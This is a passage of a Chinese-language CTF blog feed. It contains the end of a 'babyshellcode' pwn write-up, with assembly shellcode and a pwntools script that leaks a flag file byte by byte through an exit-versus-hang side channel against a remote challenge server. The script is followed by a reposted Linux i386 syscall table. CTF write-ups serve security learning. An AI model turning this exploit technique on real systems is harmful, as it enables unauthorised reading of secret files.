class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">xor rax, rax</span><br><span class="line">      xor rdi, rdi</span><br><span class="line">      xor rsi, rsi</span><br><span class="line">      xor rdx, rdx</span><br><span class="line">      mov rax, 2</span><br><span class="line">      mov rdi, 0x67616c662f2e</span><br><span class="line">      push rdi</span><br><span class="line">      mov rdi, rsp</span><br><span class="line">      syscall</span><br><span class="line"></span><br><span class="line">      mov rdx, 0x100</span><br><span class="line">      mov rsi, 0x10000</span><br><span class="line">      mov rdi, rax</span><br><span class="line">      mov rax, 0</span><br><span class="line">      syscall</span><br><span class="line">      </span><br><span class="line">      mov rsi,0x10000</span><br><span class="line">      cmp byte ptr [rsi+&#123;0&#125;] , &#123;1&#125;</span><br><span class="line">      jz loop</span><br><span class="line">      mov al,0x3c</span><br><span class="line">      syscall</span><br><span class="line">  loop:</span><br><span class="line">      jmp loop</span><br></pre></td></tr></table></figure><p>再输入第二段shellcode，这段shellcode主要是将flag读到0x10000，然后一个一个字符比较。</p><p>如果比较成功，就进入loop，失败，就调用sys_exit</p><p>通过检测eof即可爆破出flag</p><p>具体步骤见exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#todo ----------------------------------------</span></span><br><span class="line">binary = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lg   = <span class="keyword">lambda</span> name       :log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (name,<span class="built_in">eval</span>(name)))</span><br><span class="line">s    = <span class="keyword">lambda</span> payload    :p.send(payload)</span><br><span class="line">sl   = <span class="keyword">lambda</span> payload    :p.sendline(payload)</span><br><span class="line">sa   = <span class="keyword">lambda</span> a,b        :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sla  = <span class="keyword">lambda</span> a,b        :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">r    = <span class="keyword">lambda</span>            :p.recv()</span><br><span class="line">rl   = <span class="keyword">lambda</span>            :p.recvline()</span><br><span class="line">ru   = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>   :p.recvuntil(<span class="built_in">str</span>(a),b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data       :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data       :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pau</span>():</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l64</span>():</span> </span><br><span class="line">    leakaddr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    lg(<span class="string">&#x27;leakaddr&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> leakaddr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l32</span>():</span> </span><br><span class="line">    leakaddr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    lg(<span class="string">&#x27;leakaddr&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> leakaddr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">explode</span>(<span class="params"><span class="built_in">id</span>,nowchar</span>):</span></span><br><span class="line">    <span class="comment"># p = process(&quot;./chall&quot;)</span></span><br><span class="line">    shellcode1=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        and rdx,rsi</span></span><br><span class="line"><span class="string">        shl rsi</span></span><br><span class="line"><span class="string">        xor esi,esi</span></span><br><span class="line"><span class="string">        mov rsi,0x10017</span></span><br><span class="line"><span class="string">        xor rdi,rdi</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(asm(shellcode1))</span><br><span class="line"></span><br><span class="line">    shellcode2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        mov rdi, 0x67616c662f2e</span></span><br><span class="line"><span class="string">        push rdi</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdx, 0x100</span></span><br><span class="line"><span class="string">        mov rsi, 0x10000</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        mov rsi,0x10000</span></span><br><span class="line"><span class="string">        cmp byte ptr [rsi+&#123;0&#125;] , &#123;1&#125;</span></span><br><span class="line"><span class="string">        jz loop</span></span><br><span class="line"><span class="string">        mov al,0x3c</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    loop:</span></span><br><span class="line"><span class="string">        jmp loop</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(asm(shellcode2.<span class="built_in">format</span>(<span class="built_in">id</span>,nowchar)))</span><br><span class="line">    p.sendline(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now:&quot;</span>,<span class="built_in">chr</span>(ch))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,flag)</span><br><span class="line">            p = remote(<span class="string">&quot;106.14.120.231&quot;</span>,<span class="number">21274</span>)</span><br><span class="line">            <span class="comment"># p = process(&quot;./chall&quot;)</span></span><br><span class="line">            explode(i,ch)</span><br><span class="line">            (p.recv(timeout=<span class="number">2</span>))</span><br><span class="line">            flag += <span class="built_in">chr</span>(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,flag)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0-10  flag&#123;XQOaG</span></span><br><span class="line"><span class="string">10-15 oIwh4</span></span><br><span class="line"><span class="string">15-20 rRbl7</span></span><br><span class="line"><span class="string">20-30 ZUMn9kcHfx</span></span><br><span class="line"><span class="string">30-32 PY</span></span><br><span class="line"><span class="string">32-35 mWD</span></span><br><span class="line"><span class="string">35-40 iF&#125;</span></span><br><span class="line"><span class="string">flag&#123;XQOaGoIwh4rRbl7ZUMn9kcHfxPYmWDiF&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;babyshellcode&quot;&gt;&lt;a href=&quot;#babyshellcode&quot; class=&quot;headerlink&quot; title=&quot;babyshellcode&quot;&gt;&lt;/a&gt;babyshellcode&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2021/10/26/baby</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
    <category term="shellcode" scheme="http://blog.k0nashi.cn/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Linux x86架构64位、32位系统调用表</title>
    <link href="http://blog.k0nashi.cn/2021/09/14/syscall-table/"/>
    <id>http://blog.k0nashi.cn/2021/09/14/syscall-table/</id>
    <published>2021-09-14T07:26:13.000Z</published>
    <updated>2021-09-14T07:39:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>来源<a href="https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64">https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64</a><br>自用，侵删</p><h1 id="i386-Syscall-table"><a href="#i386-Syscall-table" class="headerlink" title="i386 Syscall table"></a>i386 Syscall table</h1><table><thead><tr><th>Num</th><th>syscall</th><th>%eax</th><th>arg0 (%ebx)</th><th>arg1 (%ecx)</th><th>arg2 (%edx)</th><th>arg3 (%esi)</th><th>arg4 (%edi)</th><th>arg5 (%ebp)</th></tr></thead><tbody><tr><td>0</td><td>restart_syscall</td><td>0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>1</td><td>exit</td><td>0x01</td><td>int  error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td>fork</td><td>0x02</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td>read</td><td>0x03</td><td>unsigned  int fd</td><td>char  *buf</td><td>size_t  count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>4</td><td>write</td><td>0x04</td><td>unsigned  int fd</td><td>const  char *buf</td><td>size_t  count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>5</td><td>open</td><td>0x05</td><td>const  char *filename</td><td>int  flags</td><td>umode_t  mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>6</td><td>close</td><td>0x06</td><td>unsigned  int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td>waitpid</td><td>0x07</td><td>pid_t  pid</td><td>int  *stat_addr</td><td>int  options</td><td>-</td><td>-</td><td>-</td></tr><tr><td>8</td><td>creat</td><td>0x08</td><td>const  char *pathname</td><td>umode_t  mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td>link</td><td>0x09</td><td>const  char *oldname</td><td>const  char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td>unlink</td><td>0x0a</td><td>const  char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td>execve</td><td>0x0b</td><td>const  char *filename</td><td>const  char *const *argv</td><td>const  char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td>chdir</td><td>0x0c</td><td>const  char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td>time</td><td>0x0d</td><td>time_t  *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td>mknod</td><td>0x0e</td><td>const  char *filename</td><td>umode_t  mode</td><td>unsigned  dev</td><td>-</td><td>-</td><td>-</td></tr><tr><td>15</td><td>chmod</td><td>0x0f</td><td>const  char *filename</td><td>umode_t  mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td>lchown</td><td>0x10</td><td>const  char *filename</td><td>uid_t  user</td><td>gid_t  group</td><td>-</td><td>-</td><td>-</td></tr><tr><td>17</td><td>break</td><td>0x11</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>18</td><td>oldstat</td><td>0x12</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>19</td><td>lseek</td><td>0x13</td><td>unsigned  int fd</td><td>off_t  offset</td><td>unsigned  int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td>20</td><td>getpid</td><td>0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>21</td><td>mount</td><td>0x15</td><td>char  *dev_name</td><td>char  *dir_name</td><td>char  *type</td><td>unsigned  long flags</td><td>void  *data</td><td>-</td></tr><tr><td>22</td><td>umount</td><td>0x16</td><td>char  *name</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>23</td><td>setuid</td><td>0x17</td><td>uid_t  uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>24</td><td>getuid</td><td>0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>25</td><td>stime</td><td>0x19</td><td>time_t  *tptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>26</td><td>ptrace</td><td>0x1a</td><td>long  request</td><td>long  pid</td><td>unsigned  long addr</td><td>unsigned  long data</td><td>-</td><td>-</td></tr><tr><td>27</td><td>alarm</td><td>0x1b</td><td>unsigned  int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>28</td><td>oldfstat</td><td>0x1c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>29</td><td>pause</td><td>0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>30</td><td>utime</td><td>0x1e</td><td>char  *filename</td><td>struct  utimbuf *times</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>31</td><td>stty</td><td>0x1f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>32</td><td>gtty</td><td>0x20</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>33</td><td>access</td><td>0x21</td><td>const  char *filename</td><td>int  mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>34</td><td>nice</td><td>0x22</td><td>int  increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>35</td><td>ftime</td><td>0x23</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>36</td><td>sync</td><td>0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>37</td><td>kill</td><td>0x25</td><td>pid_t  pid</td><td>int  sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>38</td><td>rename</td><td>0x26</td><td>const  char *oldname</td><td>const  char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>39</td><td>mkdir</td><td>0x27</td><td>const  char *pathname</td><td>umode_t  mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>40</td><td>rmdir</td><td>0x28</td><td>const  char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>41</td><td>dup</td><td>0x29</td><td>unsigned  int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>42</td><td>pipe</td><td>0x2a</td><td>int  *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>43</td><td>times</td><td>0x2b</td><td>struct  tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>44</td><td>prof</td><td>0x2c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>45</td><td>brk</td><td>0x2d</td><td>unsigned  long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>46</td><td>setgid</td><td>0x2e</td><td>gid_t  gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>47</td><td>getgid</td><td>0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>48</td><td>signal</td><td>0x30</td><td>int  sig</td><td>__sighandler_t  handler</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>49</td><td>geteuid</td><td>0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>50</td><td>getegid</td><td>0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>51</td><td>acct</td><td>0x33</td><td>const  char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>52</td><td>umount2</td><td>0x34</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>53</td><td>lock</td><td>0x35</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>54</td><td>ioctl</td><td>0x36</td><td>unsigned  int fd</td><td>unsigned  int cmd</td><td>unsigned  long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td>55</td><td>fcntl</td><td>0x37</td><td>unsigned  int fd</td><td>unsigned  int cmd</td><td>unsigned  long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td>56</td><td>mpx</td><td>0x38</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>57</td><td>setpgid</td><td>0x39</td><td>pid_t  pid</td><td>pid_t  pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>58</td><td>ulimit</td><td>0x3a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>59</td><td>oldolduname</td><td>0x3b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>60</td><td>umask</td><td>0x3c</td><td>int  mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>61</td><td>chroot</td><td>0x3d</td><td>const  char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>62</td><td>ustat</td><td>0x3e</td><td>unsigned  dev</td><td>struct  ustat *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>63</td><td>dup2</td><td>0x3f</td><td>unsigned  int oldfd</td><td>unsigned  int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>64</td><td>getppid</td><td>0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>65</td><td>getpgrp</td><td>0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>66</td><td>setsid</td><td>0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>67</td><td>sigaction</td><td>0x43</td><td>int</td><td>const  struct old_sigaction *</td><td>struct  old_sigaction *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>68</td><td>sgetmask</td><td>0x44</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>69</td><td>ssetmask</td><td>0x45</td><td>int  newmask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>70</td><td>setreuid</td><td>0x46</td><td>uid_t  ruid</td><td>uid_t  euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>71</td><td>setregid</td><td>0x47</td><td>gid_t  rgid</td><td>gid_t  egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>72</td><td>sigsuspend</td><td>0x48</td><td>int  unused1</td><td>int  unused2</td><td>old_sigset_t  mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td>73</td><td>sigpending</td><td>0x49</td><td>old_sigset_t  *uset</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>74</td><td>sethostname</td><td>0x4a</td><td>char  *name</td><td>int  len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>75</td><td>setrlimit</td><td>0x4b</td><td>unsigned  int resource</td><td>struct  rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>76</td><td>getrlimit</td><td>0x4c</td><td>unsigned  int resource</td><td>struct  rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>77</td><td>getrusage</td><td>0x4d</td><td>int  who</td><td>struct  rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>78</td><td>gettimeofday</td><td>0x4e</td><td>struct  timeval *tv</td><td>struct  timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>79</td><td>settimeofday</td><td>0x4f</td><td>struct  timeval *tv</td><td>struct  timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>80</td><td>getgroups</td><td>0x50</td><td>int  gidsetsize</td><td>gid_t  *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>81</td><td>setgroups</td><td>0x51</td><td>int  gidsetsize</td><td>gid_t  *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>82</td><td>select</td><td>0x52</td><td>int  n</td><td>fd_set  *inp</td><td>fd_set  *outp</td><td>fd_set  *exp</td><td>struct  timeval *tvp</td><td>-</td></tr><tr><td>83</td><td>symlink</td><td>0x53</td><td>const  char *old</td><td>const  char *new</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>84</td><td>oldlstat</td><td>0x54</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>85</td><td>readlink</td><td>0x55</td><td>const  char *path</td><td>char  *buf</td><td>int  bufsiz</td><td>-</td><td>-</td><td>-</td></tr><tr><td>86</td><td>uselib</td><td>0x56</td><td>const  char *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>87</td><td>swapon</td><td>0x57</td><td>const  char *specialfile</td><td>int  swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>88</td><td>reboot</td><td>0x58</td><td>int  magic1</td><td>int  magic2</td><td>unsigned  int cmd</td><td>void  *arg</td><td>-</td><td>-</td></tr><tr><td>89</td><td>readdir</td><td>0x59</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>90</td><td>mmap</td><td>0x5a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>91</td><td>munmap</td><td>0x5b</td><td>unsigned  long addr</td><td>size_t  len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>92</td><td>truncate</td><td>0x5c</td><td>const  char *path</td><td>long  length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>93</td><td>ftruncate</td><td>0x5d</td><td>unsigned  int fd</td><td>unsigned  long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>94</td><td>fchmod</td><td>0x5e</td><td>unsigned  int fd</td><td>umode_t  mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>95</td><td>fchown</td><td>0x5f</td><td>unsigned  int fd</td><td>uid_t  user</td><td>gid_t  group</td><td>-</td><td>-</td><td>-</td></tr><tr><td>96</td><td>getpriority</td><td>0x60</td><td>int  which</td><td>int  who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>97</td><td>setpriority</td><td>0x61</td><td>int  which</td><td>int  who</td><td>int  niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td>98</td><td>profil</td><td>0x62</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>99</td><td>statfs</td><td>0x63</td><td>const  char * path</td><td>struct  statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>100</td><td>fstatfs</td><td>0x64</td><td>unsigned  int fd</td><td>struct  statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>101</td><td>ioperm</td><td>0x65</td><td>unsigned  long from</td><td>unsigned  long num</td><td>int  on</td><td>-</td><td>-</td><td>-</td></tr><tr><td>102</td><td>socketcall</td><td>0x66</td><td>int  call</td><td>unsigned  long *args</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>103</td><td>syslog</td><td>0x67</td><td>int  type</td><td>char  *buf</td><td>int  len</td><td>-</td><td>-</td><td>-</td></tr><tr><td>104</td><td>setitimer</td><td>0x68</td><td>int  which</td><td>struct  itimerval *value</td><td>struct  itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td>105</td><td>getitimer</td><td>0x69</td><td>int  which</td><td>struct  itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>106</td><td>stat</td><td>0x6a</td><td>const  char *filename</td><td>struct  __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>107</td><td>lstat</td><td>0x6b</td><td>const  char *filename</td><td>struct  __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>108</td><td>fstat</td><td>0x6c</td><td>unsigned  int fd</td><td>struct  __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>109</td><td>olduname</td><td>0x6d</td><td>struct  oldold_utsname 